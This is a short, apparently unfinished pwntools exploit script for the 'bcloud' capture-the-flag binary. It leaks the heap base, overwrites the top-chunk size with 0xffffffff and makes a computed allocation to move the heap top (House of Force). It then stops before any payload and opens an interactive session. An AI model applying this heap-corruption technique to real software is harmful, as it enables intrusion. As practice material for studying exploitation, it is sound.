#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./bcloud"
libcPath = ""
remoteAddr = "localhost"
remotePort = 9999

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process(elfPath)
    libc = elf.libc

else:
    context.log_level = "info"
    if sys.argv[1] == "d":
        io = remote("localhost", 9999)
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def newNote(length, cont):
    io.sendlineafter(">>\n", "1")
    io.sendlineafter(":\n", str(length))
    io.sendafter(":\n", cont)

if __name__ == "__main__":
    #  DEBUG([0x8048A19])
    io.sendafter(":\n", 'a' * 0x40)
    io.recvuntil('a' * 0x40)
    heapBase = u32(io.recv(4)) - 0x8
    success("heapBase", heapBase)
    io.sendafter(":\n", 'b' * 0x40)
    io.sendafter(":\n", p32(0xffffffff) + 'c' * (0x40 - 4))

    DEBUG([0x8048A19])
    topChunk = heapBase + 0xd8
    success("topChunk", topChunk)
    newNote(topChunk - 0x804b120 - 8, 'dddd\n')
    newNote(0x10, 'eeee\n')
    
    io.interactive()
    io.close()
